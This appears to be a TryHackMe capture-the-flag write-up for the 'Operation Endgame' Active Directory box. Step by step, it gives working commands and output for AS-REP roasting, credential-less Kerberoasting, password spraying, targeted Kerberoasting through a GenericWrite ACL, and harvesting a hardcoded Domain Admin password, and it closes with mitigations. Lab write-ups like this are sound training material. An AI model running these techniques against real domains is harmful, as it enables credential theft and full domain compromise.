# THM — Operation Endgame

```
 ██████╗ ██████╗ ███████╗██████╗  █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔═══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██║   ██║██████╔╝█████╗  ██████╔╝███████║   ██║   ██║██║   ██║██╔██╗ ██║
██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
╚██████╔╝██║     ███████╗██║  ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
 ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
███████╗███╗   ██╗██████╗  ██████╗  █████╗ ███╗   ███╗███████╗
██╔════╝████╗  ██║██╔══██╗██╔════╝ ██╔══██╗████╗ ████║██╔════╝
█████╗  ██╔██╗ ██║██║  ██║██║  ███╗███████║██╔████╔██║█████╗  
██╔══╝  ██║╚██╗██║██║  ██║██║   ██║██╔══██║██║╚██╔╝██║██╔══╝  
███████╗██║ ╚████║██████╔╝╚██████╔╝██║  ██║██║ ╚═╝ ██║███████╗
╚══════╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝
                       TryHackMe — Hard
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Full Windows AD DC (`AD.THM.LOCAL`) — DNS, Kerberos, LDAP, SMB, RDP, WinRM
- [x] LDAP anonymous bind dumps the whole OU tree and every `sAMAccountName`
- [x] AS-REP roasting finds pre-auth-disabled accounts, but their hashes don't crack
- [x] Abused one of those accounts to Kerberoast *without credentials*, cracking `CODY_ROY`'s TGS to `MKO)mko0`
- [x] Password-sprayed that reused password across every domain user — `ZACHARY_HUNT` matches
- [x] RDP'd in as `ZACHARY_HUNT`; found a second, unreachable AD CS host (rabbit hole)
- [x] BloodHound (via NetExec's collector) shows `ZACHARY_HUNT` has `GenericWrite` on `JERRI_LANCASTER`
- [x] Targeted Kerberoasting on `JERRI_LANCASTER` cracks to `lovinlife!`
- [x] A GPO security template and a "Reader Admins" ACL both turn out to be dead ends (rabbit holes)
- [x] RDP as `JERRI_LANCASTER` finds a scheduled sync script with a Domain Admin's plaintext password
- [x] `SANFORD_DAUGHERTY:RESET_ASAP123` is Domain Admin — SMB to `C$` reads the **flag**

---

## Tools Used

| Tool | Purpose |
|---|---|
| RustScan / Nmap | Port and service discovery |
| enum4linux-ng / ldapsearch | Anonymous SMB and LDAP enumeration |
| impacket (`GetNPUsers.py`, `GetUserSPNs.py`) | AS-REP roasting and Kerberoasting |
| John the Ripper | Cracking AS-REP and TGS hashes offline |
| NetExec (`nxc`) | Password spraying, LDAP enum, and BloodHound collection |
| `targetedkerberoast` | Exploiting a `GenericWrite` ACL into a Kerberoastable SPN |
| BloodHound CE | Mapping ACL/object-control edges between users |
| xfreerdp3 | Interactive RDP sessions as three different domain users |
| smbclient | Reading SYSVOL GPOs and the final `C$` flag |

---

## TL;DR

Anonymous LDAP enumeration hands over every username in the domain. AS-REP roasting finds accounts with Kerberos pre-auth disabled, but their hashes don't crack directly — the real move is using one of those accounts to request service tickets for *other* users without ever needing a password, which nets a crackable TGS for `CODY_ROY` (`MKO)mko0`). That password is reused by `ZACHARY_HUNT`, found by spraying it across the whole user list. RDP as `ZACHARY_HUNT` leads to a dead-end AD CS host, but BloodHound (collected via NetExec) reveals `ZACHARY_HUNT` holds `GenericWrite` on `JERRI_LANCASTER` — enough to add a fake SPN and Kerberoast an account that was never roastable in the first place. That cracks to `lovinlife!`. A GPO dig and a group-ACL lead both go nowhere; the real foothold-to-domain-admin jump is a scheduled PowerShell sync script sitting in `C:\Scripts`, hardcoding the plaintext password for `SANFORD_DAUGHERTY` — a Domain Admin. From there, `C$` gives read access to the Administrator's desktop and the flag.

## Introduction

Operation Endgame is a hard Windows Active Directory box built as a chain of credential-reuse and ACL-abuse steps rather than a single memorable exploit. Every foothold on this box comes from taking a weakness meant for one purpose and using it for another: AS-REP-disabled accounts become a way to Kerberoast *other* users without credentials, a `GenericWrite` ACL edge becomes a way to Kerberoast an account that was never exposed, and a leftover automation script becomes a Domain Admin credential leak. The hardest part of the box isn't any individual technique — it's resisting the pull of two convincing-looking GPO/ACL rabbit holes that sit right next to the real path.

## Recon

```bash
rustscan -a operationendgame.thm --ulimit 5000 -b 500 -t 1500 -r 1-65535 -- -Pn -sV -sV
```

The port list is a textbook Domain Controller:

```
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Domain: thm.local, Site: Default-First-Site-Name
443/tcp   open  ssl/http
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ldapssl
3389/tcp  open  ms-wbt-server
47001/tcp open  http          (WinRM over HTTP)
Service Info: Host: AD; OS: Windows
```

SMB allows a null session and LDAP allows an anonymous bind — enough to dump the entire directory:

```bash
enum4linux-ng -A 10.48.154.243
ldapsearch -x -H ldap://10.48.154.243 -b 'DC=thm,DC=local' '(objectClass=*)' sAMAccountName description
```

The dump reveals a large OU structure (`Tier 1`, `Tier 2`, `Stage`, `People`, service accounts) and dozens of real usernames — enough to build a proper `users.txt` for the next steps.

## Foothold

### AS-REP roasting — hashes found, but uncrackable directly

```bash
GetNPUsers.py thm.local/ -dc-ip 10.48.154.243 -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt
```

Several accounts (`SHELLEY_BEARD`, `ISIAH_WALKER`, and others) come back with `UF_DONT_REQUIRE_PREAUTH` set, meaning Kerberos hands out an AS-REP without checking a password first. Straightforward cracking attempts against all five hashes come back empty:

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt   # no GPU runtime, fails
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt            # 0g
john --format=krb5asrep --wordlist=/usr/share/seclists/.../10k-most-common.txt asrep.txt # 0g
```

### Kerberoasting without credentials

Having an AS-REP-roastable account is useful beyond cracking its own hash: `GetUserSPNs.py` supports `-no-preauth` to request service tickets *for other users* using that account's lack of pre-auth as the authentication bypass — no valid password is needed at all.

```bash
GetUserSPNs.py thm.local/SHELLEY_BEARD -dc-ip 10.48.154.243 -no-preauth SHELLEY_BEARD \
  -usersfile users.txt -request -outputfile kerb.txt
```

This nets a TGS hash for `CODY_ROY`, the one user in the list that actually holds a Service Principal Name. It cracks cleanly against rockyou:

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerb.txt
# MKO)mko0
```

### Password spray reveals reuse

```bash
nxc smb 10.48.154.243 -u "$PWD/users.txt" -p 'MKO)mko0' -d thm.local --continue-on-success
```

Most attempts fail, but one domain user reuses `CODY_ROY`'s cracked password outright:

```
SMB  10.48.154.243  445  ad  [+] thm.local\ZACHARY_HUNT:MKO)mko0
```

## Shell / Initial Access

```bash
xfreerdp3 /v:ad.thm.local /u:ZACHARY_HUNT /d:thm.local '/auth-pkg-list:!kerberos' /cert:ignore
```

(Disabling the Kerberos auth package in the negotiation is necessary — otherwise FreeRDP tries to resolve a KDC for the realm before falling back to NTLM, and fails outright.) The session drops into a locked-down desktop with no Start menu or Explorer access; `Win+R` → `cmd` gets a working shell:

```
C:\Users\TEMP>whoami
thm\zachary_hunt
```

## Escalation Path

### A second host, out of reach (see Rabbit Holes)

Poking at certificate services from this session (`sc query CertSvc`, `certutil -config - -ping`) surfaces a second CA host, `labyrinth.thm.local`, resolving to `10.10.43.23` — a different subnet entirely, unreachable from both the RDP session and the attack box. This line of investigation (AD CS enrollment, the CES web endpoint) goes nowhere; see Rabbit Holes.

### BloodHound finds the real edge

Back on the attack box, collect the graph as `ZACHARY_HUNT`:

```bash
nxc ldap 10.48.154.243 -u ZACHARY_HUNT -p 'MKO)mko0' -d thm.local --dns-server 10.48.154.243 --bloodhound -c All
```

Loaded into BloodHound CE, the graph shows `ZACHARY_HUNT` holds a **`GenericWrite`** edge onto `JERRI_LANCASTER` — an account with no SPN of its own, so it was never AS-REP- or Kerberoastable by default. `GenericWrite` is enough to change that: write a temporary SPN onto the account, request a ticket for it, then clean up.

```bash
targetedkerberoast -v -d thm.local -u ZACHARY_HUNT -p 'MKO)mko0' --dc-ip 10.48.154.243 \
  --request-user JERRI_LANCASTER -o jerri.hash
```

```
[VERBOSE] SPN added successfully for (JERRI_LANCASTER)
[+] Writing hash to file for (JERRI_LANCASTER)
[VERBOSE] SPN removed successfully for (JERRI_LANCASTER)
```

The resulting `$krb5tgs$23$*JERRI_LANCASTER$...` hash cracks offline to `lovinlife!`.

```bash
nxc ldap 10.48.154.243 -u JERRI_LANCASTER -p 'lovinlife!' -d thm.local
# [+] thm.local\JERRI_LANCASTER:lovinlife!
```

## Exploitation

A GPO dig through SYSVOL and a "Reader Admins" group-ACL lead both look promising and both go nowhere (see Rabbit Holes). The actual path is simpler: RDP directly as `JERRI_LANCASTER` and look at what's sitting on disk.

```bash
xfreerdp3 /v:10.48.154.243 /u:JERRI_LANCASTER /d:THM /sec:nla '/auth-pkg-list:!kerberos' /cert:ignore
```

```
C:\Users\TEMP.THM>dir C:\Scripts
05/13/2024  06:50 PM    426 syncer.ps1

C:\Users\TEMP.THM>type C:\Scripts\syncer.ps1
Import-Module ActiveDirectory

$Username = "SANFORD_DAUGHERTY"
$Password = ConvertTo-SecureString "RESET_ASAP123" -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($Username, $Password)

Sync-ADObject -Object "DC=thm,DC=local" -Source "ad.thm.local" -Destination "ad2.thm.local" -Credential $Credential
```

A scheduled replication script, left readable by any user who can RDP in, hardcodes a plaintext Domain Admin credential:

```bash
nxc ldap 10.48.154.243 -u SANFORD_DAUGHERTY -p 'RESET_ASAP123' -d thm.local
# [+] thm.local\SANFORD_DAUGHERTY:RESET_ASAP123 (Pwn3d!)
```

With Domain Admin confirmed, `C$` is fully readable:

```bash
smbclient //10.48.154.243/C$ -U 'THM/SANFORD_DAUGHERTY%RESET_ASAP123' -c 'get Users/Administrator/Desktop/flag.txt.txt flag.txt'
cat flag.txt
```

```
THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}
```

## Rabbit Holes

- **The `labyrinth.thm.local` AD CS host:** certificate service queries from the `ZACHARY_HUNT` RDP session point at a second CA server on a `10.10.43.x` network. Every attempt to reach it — from the RDP session, with DNS overrides on the attack box, even a direct `--resolve` to its IP — fails with "no route to host." It is simply not reachable from this attack path, and the CES/enrollment angle was dropped entirely.
- **The default-domain GPO's `GptTmpl.inf`:** pulled down expecting a privilege-rights misconfiguration; it turns out to be unmodified default security policy, no escalation value.
- **The "Reader Admins" group:** BloodHound shows `JERRI_LANCASTER` is already a member with some ACL edges nearby, which looked like a WriteOwner/AddSelf escalation. Closer inspection shows the powerful ACL edges in that part of the graph actually originate from `DOMAIN ADMINS` onto a *different* account (`CHRISTIAN_SANFORD`), with no control path from Jerri into that chain. Exploiting group ownership here was never the answer.

## Flag

| Flag | Value |
|---|---|
| Root | `THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}` |

## Mitigations

- **AS-REP roastable accounts:** enforce Kerberos pre-authentication for every account. Beyond letting an attacker crack that account's own password offline, a pre-auth-disabled account can be used as a stepping stone to request tickets for *other* SPN-holding accounts without any credentials at all.
- **Password reuse across accounts:** `CODY_ROY`'s cracked password being valid for `ZACHARY_HUNT` turned one offline crack into two compromised accounts. Enforce unique passwords and monitor for spray patterns across the whole user base, not just privileged ones.
- **Overly broad `GenericWrite` ACLs:** `ZACHARY_HUNT` holding write access over `JERRI_LANCASTER` let a non-SPN account become Kerberoastable on demand. Audit AD object ACLs regularly (BloodHound itself is the right tool for this) and remove delegated write access that isn't operationally necessary.
- **Secrets in scheduled scripts:** `C:\Scripts\syncer.ps1` hardcoded a Domain Admin's plaintext password for an AD replication task. Use a Group Managed Service Account (gMSA) or a credential vault (gMSA, CyberArk, Secrets Server) instead of embedding credentials in a script that any interactive user on the box can read.

## Key Takeaway

Almost nothing on this box is a vulnerability in the classic sense — it's a sequence of features used slightly outside their intended purpose: AS-REP roasting repurposed as a credential-less Kerberoasting primitive, a `GenericWrite` edge repurposed into a Kerberoastable SPN that didn't exist before, and a convenience automation script repurposed into a Domain Admin credential leak. The transferable lesson is to treat BloodHound's ACL edges as the actual map of the domain rather than relying on group names (`Reader Admins` sounds harmless; `GenericWrite` on an ordinary user is not) — and to always check `C:\Scripts`, `C:\Tasks`, and similar automation folders the moment an interactive session lands.

## If I Did It Again

I'd skip the `labyrinth.thm.local` detour the moment the first `tracert`/`Test-NetConnection` showed no route, rather than retrying it from several different angles. I'd also run BloodHound's ACL analysis before touching any GPO files — the two real pivots (`GenericWrite` on Jerri, then the scheduled script) were both things BloodHound or a basic `dir` would have surfaced immediately, while the GPO and group-ACL detours cost real time for no payoff.

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-11-23 | First writeup from my notes. |

[Back to top](#thm--operation-endgame)
